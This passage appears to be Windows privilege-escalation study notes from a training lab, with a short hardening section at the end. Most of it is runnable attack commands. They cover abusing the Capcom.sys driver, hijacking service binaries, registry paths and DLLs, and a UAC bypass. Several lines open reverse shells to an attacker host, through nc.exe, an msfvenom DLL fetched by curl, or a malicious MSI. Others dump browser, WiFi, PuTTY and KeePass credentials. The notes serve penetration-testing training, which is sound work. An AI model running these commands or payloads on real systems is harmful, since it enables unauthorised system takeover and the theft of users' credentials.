secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Print Operators Group

Members have SeLoadDriverPrivilege, can log in locally to domain controllers, and can shut them down.

Attack flow (loads a vulnerable kernel driver):

// Step 1: Download and edit EnableSeLoadDriverPrivilege.cpp
// Replace includes with Windows headers, then compile:

cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

cl.exe is the Microsoft C/C++ compiler (Visual Studio). Compiles the privilege enabler.

# Step 2: Download vulnerable Capcom.sys driver
# Add registry reference so Windows knows where to find it
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The \??\ prefix is an NT Object Path — how Windows resolves the driver path at the kernel level.

# Step 3: Verify driver is NOT currently loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

# Step 4: Enable the privilege and load the driver
EnableSeLoadDriverPrivilege.exe

# Step 5: Verify Capcom is now listed
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

# Step 6: Exploit Capcom.sys to get SYSTEM
.\ExploitCapcom.exe
# Launches a SYSTEM shell

Automation with EoPLoadDriver:

EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

Automates enabling privilege + creating registry key + loading the driver.

12. Weak Service / File Permissions

Services run as SYSTEM. If you can modify the service binary or its configuration, you can execute code as SYSTEM.

Finding Misconfigured Services with SharpUp

.\SharpUp.exe audit
# Look for: === Modifiable Services ===

SharpUp audits for common PrivEsc vectors. "Modifiable Services" section shows services where your user has write access.

Checking Permissions with icacls

icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

icacls shows/modifies ACLs. Look for BUILTIN\Users or Everyone having (F) (Full Control) or (W) (Write) on service executables. That's your attack surface.

Exploiting: Replacing a Service Binary

# Backup original
copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" C:\Temp\SecurityService_backup.exe

# Replace with malicious binary (e.g., one that adds admin user)
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

When the service starts/restarts, your binary runs as SYSTEM.

Exploiting: Changing Service Binary Path (Weak Service ACL)

# Check service ACL with accesschk
accesschk.exe /accepteula -quvcw WindscribeService
# Look for: SERVICE_ALL_ACCESS for Authenticated Users or your group

# Modify the binary path to run your command
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

# Stop the service
sc stop WindscribeService

# Start it — it fails, but your command runs first
sc start WindscribeService

# Verify you're now admin
net localgroup administrators

# CLEANUP: Revert binary path
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
sc start WindScribeService

Searching for All Vulnerable Services (One-Liner)

wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

Finds auto-start services not in C:\Windows\ and not enclosed in quotes. The combination reveals both misconfigured permissions AND unquoted paths.

13. Unquoted Service Paths

When a service binary path contains spaces AND is not quoted, Windows tries multiple locations to find the executable.

Example: Binary path = C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

Windows tries in order:
1. C:\Program.exe
2. C:\Program Files.exe
3. C:\Program Files (x86)\System.exe
4. C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

If you can place a file at #1, #2, or #3, it runs as SYSTEM when the service starts.

# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Verify specific service
sc qc SystemExplorerHelpService
# If BINARY_PATH_NAME has spaces without quotes → vulnerable

Limitation: Creating files in C:\ or C:\Program Files requires admin rights, so this is less often exploitable than it appears.

14. Weak Registry Permissions & Autoruns

Weak Service Registry ACLs

If your user can write to a service's registry key, you can change its ImagePath to point to a malicious binary.

# Check registry service keys for write permissions
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
# Look for: RW (Read-Write) on service keys

# Exploit: Change ImagePath to point to your payload
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"

When the service starts, it runs your nc.exe instead of the legitimate binary, giving you a reverse shell.

Modifiable Registry Autorun Binary

Programs in autorun registry keys execute when a user logs in. If you can write to these locations or replace the binary they point to, you can execute code in the context of the next user who logs in.

# Check what runs at startup
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl

Look for binaries in user-writable locations.

Reference for all autorun locations:
- Persistence locations

15. Kernel Exploits

If the system is unpatched, public kernel exploits may grant direct SYSTEM access. Always check patch level before diving into complex attack paths.

Checking Patch Level

systeminfo
wmic qfe

Cross-reference installed KBs against CVE databases.

Windows Exploit Suggester - Next Generation (WES-NG)

# On attack box: update the vulnerability database
sudo python2.7 windows-exploit-suggester.py --update

# Run against systeminfo output from target
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt

WES-NG takes the output of systeminfo and cross-references it with a vulnerability database to suggest applicable exploits.

Checking Windows Version for Exploit Compatibility

[environment]::OSVersion.Version

Returns major.minor.build.revision. Cross-reference build number with Windows release versions to determine exact OS version and applicable exploits.

Notable exploits (partial table):

Exploit OS Versions

16. Vulnerable Services – Third-Party

Druva inSync Client (Example of CVE-Based PrivEsc)

This is an example of a vulnerable third-party service. The Druva inSync client ran with SYSTEM privileges and had an RPC interface on localhost:6064 that could be called by any user to execute arbitrary commands.

# Check if the service is running
get-service | ? {$_.DisplayName -like 'Druva*'}

# Get the process ID
get-process -Id 3324

The exploit connects to the RPC port and sends a specially crafted request:

# Simplified PoC - connect to localhost:6064 and send command
$s = New-Object System.Net.Sockets.Socket(
  [System.Net.Sockets.AddressFamily]::InterNetwork,
  [System.Net.Sockets.SocketType]::Stream,
  [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)
# ... (send magic header + command)

Lesson: Always check installed third-party software versions. Look for public CVEs. wmic product get name gives you the list.

17. DLL Injection & DLL Hijacking

DLL Injection Overview

DLL injection forces a running process to load a malicious DLL. Common methods:

1. LoadLibrary Injection: Allocate memory in target process, write DLL path, create remote thread starting at LoadLibrary. Code:

// Key API calls:
VirtualAllocEx()     // Allocate memory in target process
WriteProcessMemory() // Write DLL path to that memory
GetProcAddress()     // Get address of LoadLibraryA in kernel32.dll
CreateRemoteThread() // Create thread in target pointing to LoadLibrary

2. Reflective DLL Injection: DLL loads itself into memory without LoadLibrary — harder for AV to detect since it doesn't appear in the standard loaded modules list.

3. Manual Mapping: Manually map DLL into process memory and resolve imports. Most complex, most evasion-capable.

DLL Hijacking

Windows searches for DLLs in this order (Safe DLL Search Mode ON):
1. Directory the application loaded from
2. C:\Windows\System32
3. C:\Windows\System (not used on 64-bit)
4. C:\Windows
5. Current working directory
6. Directories in PATH (left to right)

If Safe DLL Search Mode is OFF, the current directory moves up to position 2 — much more exploitable.

Finding hijackable DLLs:
- Process Monitor (procmon): Filter for Result is NAME NOT FOUND and Path ends with .dll — shows DLLs the app tries to load but can't find
- Process Explorer: Shows loaded DLLs for each process
- PE Explorer: Inspects .exe/.dll import tables

UAC Bypass via DLL Hijacking (see Section 18):
Many Windows trusted binaries auto-elevate and load DLLs from user-writable locations — this combines UAC bypass with DLL hijacking.

# Check if a specific directory in PATH is writable
icacls "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps"

18. UAC Bypass

User Account Control (UAC) creates a split-token for admin users — one medium-integrity token (for normal use) and one high-integrity token (for elevated actions). UAC bypass techniques promote you from medium to high integrity without triggering the consent prompt.

Checking UAC Status

# Check if UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
# 0x1 = UAC enabled, 0x0 = disabled

# Check UAC level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

Values:
- 0 = No prompt (auto-elevate)
- 1 = Prompt for creds on secure desktop
- 2 = Prompt for consent on secure desktop
- 3 = Prompt for creds
- 4 = Prompt for consent
- 5 = Prompt for consent for non-Windows binaries (DEFAULT)

# Check Windows build version (needed to pick the right bypass)
[environment]::OSVersion.Version

Cross-reference build number: Windows release history

UAC Bypass via DLL Hijacking (SystemPropertiesAdvanced.exe)

SystemPropertiesAdvanced.exe (32-bit version) auto-elevates AND tries to load srrstr.dll — which doesn't exist on the system. If you place a malicious srrstr.dll in a user-writable PATH directory, it loads with high integrity.

# Review PATH to find writable directory
cmd /c echo %PATH%
# WindowsApps folder in user profile is writable

# On attack box: create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll -o srrstr.dll
# Host it
python3 -m http.server 8080

# On target: download malicious DLL to writable PATH directory
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# Test with rundll32 first (will give unprivileged shell to verify connectivity)
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll

# Now trigger the actual bypass — execute the 32-bit version
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

The 32-bit binary loads from SysWOW64, searches the PATH, finds your DLL, loads it elevated. You get a high-integrity reverse shell with full admin privileges.

Reference: UACME Project

The UACME project documents a comprehensive list of UAC bypasses including the affected Windows builds:
https://github.com/hfiref0x/UACME

19. Credential Hunting

Credentials found during PrivEsc can unlock further access — lateral movement, domain escalation, or directly becoming admin.

Application Configuration Files

# Search all text/config/XML files for the word "password"
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

/S = search subdirectories, /I = case-insensitive, /M = print only filenames (not the matching lines). Remove /M to see context.

IIS Config:

C:\inetpub\wwwroot\web.config

Often contains database connection strings with plaintext credentials.

Unattend files (Windows deployment):

C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

Auto-logon credentials stored in plaintext or Base64.

Chrome Dictionary Files

gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

Chrome underlines unknown words. Users sometimes add passwords to the dictionary to stop the red underline. Weird but effective.

PowerShell History

# Find where history is saved
(Get-PSReadLineOption).HistorySavePath

# Read history for current user
gc (Get-PSReadLineOption).HistorySavePath

Default path: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
May contain commands with embedded credentials (e.g., wevtutil /u:admin /p:Password123).

# Read history for ALL users (if you have access)
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

Reference: Microsoft Windows Commands PDF

PowerShell Credentials (SecureString / Clixml)

# Decrypt a SecureString credential saved as XML (only works as the same user)
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password

PowerShell Export-Clixml encrypts credentials using DPAPI tied to the current user. If you're running as that user, you can decrypt it trivially.

Manual File System Search

# Search file contents for "password" in multiple file types
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

# PowerShell file content search
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

# Find files with interesting names/extensions
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ *.config

# PowerShell: search for specific extensions recursively
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore

Sticky Notes Database

StickyNotes stores notes in an SQLite database — users often put passwords here.

C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

# Read with PSSQLite module
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# Or copy to Linux and use strings
strings plum.sqlite-wal

Other High-Value Files

%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security

20. Other Credential Theft Techniques

Saved Credentials (cmdkey)

# List saved credentials
cmdkey /list

Shows credentials stored in Windows Credential Manager. Example: RDP credentials for another server.

# Use saved credentials to run a command as another user
runas /savecred /user:inlanefreight\bob "COMMAND HERE"

/savecred uses stored credentials without prompting for a password.

Browser Credentials (SharpChrome)

.\SharpChrome.exe logins /unprotect

Extracts saved Chrome usernames and passwords. Uses DPAPI to decrypt. Only works as the user who saved the credentials.

LaZagne – All-in-One Password Dumper

# View available modules
.\lazagne.exe -h

# Run all modules (browsers, WiFi, email, databases, etc.)

LaZagne extracts passwords from dozens of applications. Returns cleartext passwords from WinSCP, browsers, Git, databases, and more.

SessionGopher – Remote Tool Credential Extraction

Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01

Decrypts saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP session credentials stored in the registry. Shows hostnames, usernames, and passwords.

Registry – AutoLogon Credentials

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

If AutoLogon is configured, DefaultUserName and DefaultPassword are stored in plaintext here. Any standard user can read this.

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Look for: AutoAdminLogon=1, DefaultUserName, DefaultPassword

Registry – PuTTY Proxy Credentials

# List saved PuTTY sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

# Read a specific session's details
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh"
# Look for: ProxyUsername, ProxyPassword (stored in cleartext!)

WiFi Passwords

# List saved wireless networks
netsh wlan show profile

# Retrieve pre-shared key for a specific network
netsh wlan show profile ilfreight_corp key=clear

key=clear reveals the plaintext PSK under Key Content. Useful for accessing isolated wireless segments.

KeePass Database Cracking

# Extract hash from KeePass database
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx

# Crack with hashcat
hashcat -m 13400 keepass_hash.txt rockyou.txt

.kdbx files are password manager databases. If you find one on a file share or workstation, crack the master password and potentially get hundreds of enterprise credentials.

21. Pillaging & Post-Exploitation

Installed Applications

dir "C:\Program Files"
dir "C:\Program Files (x86)"

Check for interesting applications: mRemoteNG, MobaXterm, RealVNC, mstsc → may have saved session credentials.

mRemoteNG Credential Extraction

mRemoteNG stores encrypted credentials in confCons.xml:

C:\Users\<user>\AppData\Roaming\mRemoteNG\confCons.xml

Encryption uses AES, but if the master password is blank (default), it can be cracked easily. Tools like mremoteng_decrypt.py can extract credentials.

Slack Token Extraction

# Find Slack cookies/tokens
Get-ChildItem -Path 'C:\Users\<user>\AppData\Roaming\Slack\' -Recurse

Slack tokens allow API access and can be used to access channels, files, and messages — potentially containing credentials.

22. Living Off The Land (LOLBAS)

LOLBAS (Living Off the Land Binaries and Scripts) — using legitimate Windows binaries for malicious purposes. Reference: https://lolbas-project.github.io/

File Transfer with certutil

# Download a file (like wget on Windows)
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

certutil is normally a certificate utility. -urlcache -split -f downloads a file from a URL. Works even in restricted environments.

# Encode file to Base64 (for exfiltration)
certutil -encode file1 encodedfile

# Decode Base64 file
certutil -decode encodedfile file2

Useful for transferring binary files over text-only channels.

Always Install Elevated (MSI PrivEsc)

If this policy is enabled, any user can install MSI packages with SYSTEM privileges.

# Check if Always Install Elevated is enabled (both keys must be 1)
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
# Look for: AlwaysInstallElevated = 0x1

# Create malicious MSI package
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

# Execute the MSI (runs as SYSTEM if policy is enabled)
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

Scheduled Tasks

# Enumerate all scheduled tasks
schtasks /query /fo LIST /v

# PowerShell equivalent
Get-ScheduledTask | select TaskName,State

Look for scheduled tasks running as SYSTEM whose binary or script is in a user-writable location. If you can overwrite the binary/script, it runs as SYSTEM next time the task executes.

runas with Saved Credentials

# Use saved/known credentials to run a command as another user
runas /savecred /user:inlanefreight\bob "COMMAND HERE"

23. Miscellaneous Techniques

Checking Computer Description Field

Get-WmiObject -Class Win32_OperatingSystem | select Description
Get-LocalUser

Admins sometimes put passwords or helpful notes in computer/user description fields. Always check.

Scheduled Task Permissions Check

.\accesschk64.exe /accepteula -s -d C:\Scripts\

Checks permissions on a directory. If your user has write access to a directory where scheduled task scripts live, you can replace the script and get code execution at task runtime.

Erlang Port (25672)

Applications like RabbitMQ, SolarWinds, and CouchDB use Erlang for distributed computing. The Erlang network port uses a "cookie" for cluster authentication. Weak cookies (like rabbit for RabbitMQ) or cookies stored in readable config files allow joining the cluster and potentially RCE.

Reference: Erlang-arce blogpost by Mubix

Traffic Capture (Wireshark / Network Sniffing)

If Wireshark is installed and accessible to unprivileged users, you may be able to capture network traffic and extract credentials from cleartext protocols (HTTP, FTP, Telnet).

# Check if Wireshark is installed and accessible
Get-Process *wireshark* 2>$null

24. Mitigation & Hardening

Understanding mitigations helps you identify what's likely misconfigured in client environments.

  • Patching: Apply all security updates promptly. Use WSUS/SCCM for centralized management. Critical patches should be deployed within 24-48 hours of release.
  • Principle of Least Privilege: Users should only have the rights they need. No unnecessary admin rights on workstations. No SeImpersonatePrivilege for regular users.
  • Enable UAC at the highest level (Always notify).
  • LAPS (Local Administrator Password Solution): Randomize local admin passwords per machine — prevents pass-the-hash across all systems using the same password.
  • Disable unnecessary services and remove unneeded software.
  • Audit service permissions — no user-writable service binaries or directories.
  • Protect sensitive files — web.config, SAM hives, unattend.xml should have strict ACLs.
  • AppLocker/WDAC — application whitelisting to prevent unauthorized code execution.
  • Audit logs — enable process creation logging (Event ID 4688 with command-line parameters).
  • Credential Guard — protects LSASS from memory dumps.
  • Periodic security assessments — find these issues before attackers do.
